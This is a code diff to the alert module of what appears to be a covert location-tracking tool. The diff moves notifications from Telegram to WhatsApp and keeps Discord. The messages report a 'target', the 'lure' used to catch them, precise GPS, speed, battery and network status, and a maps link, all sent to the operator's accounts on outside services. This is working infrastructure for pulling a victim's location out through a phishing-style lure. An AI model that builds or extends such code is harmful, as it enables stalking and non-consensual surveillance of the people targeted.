@@ -1,17 +1,19 @@
-// Notification Service for Telegram & Discord Webhooks
+// Notification Service for WhatsApp & Discord Webhooks
 const db = require("./db")
 
-// Throttle map so we don't spam webhooks on 4-second intervals
+// Throttle map so we don't spam alerts on 4-second intervals
 const lastNotified = {}
 
 class Notifier {
     async sendTargetAlert(target, eventType = "update") {
         const settings = db.getSettings()
-        const tgToken = settings.telegramBotToken
-        const tgChatId = settings.telegramChatId
+        const waPhone = settings.whatsappPhone
+        const waApiKey = settings.whatsappApiKey
+        const waWebhook = settings.whatsappWebhookUrl
         const discordWebhook = settings.discordWebhookUrl
 
-        if (!tgToken && !discordWebhook) {
+        const hasWhatsApp = (waPhone && waApiKey) || waWebhook
+        if (!hasWhatsApp && !discordWebhook) {
             return // No notifications configured
         }
 
@@ -38,30 +40,50 @@ class Notifier {
         else if (eventType === "gps_acquired") title = "🎯 Precise GPS Acquired!"
         else if (eventType === "geofence_breach") title = "⚠️ GEOFENCE BREACH DETECTED!"
 
-        // 1. Send Telegram Notification
-        if (tgToken && tgChatId) {
-            const tgMessage = `*${title}*\n\n` +
-                `👤 *Target ID:* \`${target.id}\`\n` +
-                `🎭 *Lure Template:* ${lureStr}\n` +
-                `📡 *Signal Type:* ${target.type || 'GPS'} (${accuracyStr})\n` +
+        // 1. Send WhatsApp Notification
+        if (hasWhatsApp) {
+            const waMessage = `*${title}*\n\n` +
+                `👤 *Target ID:* ${target.id}\n` +
+                `🎭 *Lure:* ${lureStr}\n` +
+                `📡 *Signal:* ${target.type || 'GPS'} (${accuracyStr})\n` +
                 `🏎️ *Speed:* ${speedStr}\n` +
                 `🔋 *Battery:* ${batteryStr} | 📶 *Net:* ${networkStr}\n` +
                 `🕒 *Time:* ${timeStr}\n\n` +
-                `🗺️ [Open in Google Maps](${gmapsUrl})`
+                `🗺️ *Google Maps:* \n${gmapsUrl}`
 
-            try {
-                await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: tgChatId,
-                        text: tgMessage,
-                        parse_mode: "Markdown",
-                        disable_web_page_preview: false
+            // A) Send via CallMeBot WhatsApp API
+            if (waPhone && waApiKey) {
+                try {
+                    const cleanPhone = waPhone.replace(/[^0-9]/g, "")
+                    const encodedText = encodeURIComponent(waMessage)
+                    const url = `https://api.callmebot.com/whatsapp.php?phone=${cleanPhone}&text=${encodedText}&apikey=${encodeURIComponent(waApiKey)}`
+
+                    const res = await fetch(url)
+                    if (!res.ok) {
+                        console.warn("[WhatsApp CallMeBot Notice]:", res.status, res.statusText)
+                    }
+                } catch (err) {
+                    console.warn("[WhatsApp Notifier Error]:", err.message)
+                }
+            }
+
+            // B) Send via Custom WhatsApp Webhook / Gateway
+            if (waWebhook && waWebhook.startsWith("http")) {
+                try {
+                    await fetch(waWebhook, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            phone: waPhone || "",
+                            message: waMessage,
+                            target,
+                            gmapsUrl,
+                            eventType
+                        })
                     })
-                })
-            } catch (err) {
-                console.warn("[Telegram Notifier Error]:", err.message)
+                } catch (err) {
+                    console.warn("[WhatsApp Webhook Error]:", err.message)
+                }
             }
         }
 
@@ -70,7 +92,7 @@ class Notifier {
             const embedColor = eventType === "geofence_breach" ? 0xef4444 : (eventType === "connect" ? 0x22c55e : 0x0284c7)
             const discordPayload = {
                 username: "Live Location Tracker",
-                avatar_url: "https://img.icons8.com/color/96/satellite-sending-signal.png",
+                avatar_url: "https://img.icons8.com/color/96/whatsapp--v1.png",
                 embeds: [
                     {
                         title,
